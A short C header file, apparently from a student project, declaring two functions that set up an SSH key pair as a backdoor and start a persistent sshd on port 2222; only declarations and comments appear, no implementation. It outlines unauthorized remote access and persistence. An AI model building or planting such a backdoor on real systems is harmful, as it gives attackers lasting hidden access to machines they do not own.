/**
 * @file backdoor.h
 *
 * @author Enzocte <enzo.cateau@etudiant.univ-lr.fr>
 * @date 2026
 */

#pragma once

/**
 * @brief Generating a ssh keys pair and configure a backdoor
 *
 * @return void
 */
extern void ssh_backdoor();

/**
 * @brief Deploys a persistence SShd server on the port 2222
 *
 * @return PID du processus sshd (0 si déjà actif)
 */
extern int ssh_persistent_server();
